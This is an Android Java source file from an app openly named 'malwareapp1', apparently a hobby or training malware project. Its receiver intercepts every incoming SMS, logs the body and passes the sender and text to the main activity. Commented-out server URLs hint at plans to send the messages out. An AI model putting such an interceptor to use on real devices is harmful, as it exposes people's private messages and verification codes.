package com.hackinghell.malwareapp1;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.provider.Telephony;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;
import android.Manifest;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.localbroadcastmanager.content.LocalBroadcastManager;

import com.hackinghell.malwareapp1.databinding.ActivityMainBinding;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;
import com.hackinghell.malwareapp1.MainActivity;

public class smsreceiver extends BroadcastReceiver {

    private static final int SMS_PERMISSION_CODE = 100;
    //private static final String BASE_URL = "https://rafaelisawesomeandsupercool.com";
    //private static final String BASE_URL = "https://29d9c014f3e242d1a267c086ec99640b.api.mockbin.io/";

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.i("sms", "You ve got mail");

        if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction())) {
            SmsMessage[] messages = Telephony.Sms.Intents.getMessagesFromIntent(intent);
            for (SmsMessage message : messages) {
                String sender = message.getOriginatingAddress();
                String body = message.getMessageBody();
                Log.i("sms", body);
                Toast.makeText(context, body + " From" + sender, Toast.LENGTH_SHORT).show();

                // Intent to send data to main activity
                if (MainActivity.isMainActivityVisible) {
                    Intent intent3 = new Intent("sms_broadcast");
                    intent3.putExtra("smsBody", body);
                    intent3.putExtra("smsSender", sender);
                    LocalBroadcastManager.getInstance(context).sendBroadcast(intent3);
                    Log.i("sms", String.valueOf(MainActivity.isMainActivityVisible));
                } else {
                    Intent intent2 = new Intent(context, MainActivity.class);
                    intent2.putExtra("smsBody", body);
                    intent2.putExtra("smsSender", sender);
                    intent2.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    context.startActivity(intent2);
                }
            }
        }
    }
}
